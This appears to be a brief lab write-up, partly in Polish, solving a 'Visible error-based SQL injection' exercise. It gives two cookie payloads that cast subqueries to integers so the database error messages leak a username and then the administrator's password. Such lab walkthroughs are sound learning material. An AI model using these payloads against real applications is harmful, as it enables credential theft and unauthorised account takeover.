Title: Visible error-based SQL injection
Level: Practitioner
Desc: This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.
The database contains a different table called users, with columns called username and password. To solve the lab, find a way to leak the password for the administrator user, then log in to their account. 

payload: `TrackingId=9' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`
![image](https://github.com/user-attachments/assets/c7afd8bd-f2a6-455b-bc71-46f5d4d0feb3)
wynik: Error zdradził istnienie konta administrator

payload: `TrackingId=9' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`
![image](https://github.com/user-attachments/assets/e4b0dfde-043f-49df-9d4c-660d33725c20)
wynik: Error zdradził hasło użytkownika administrator
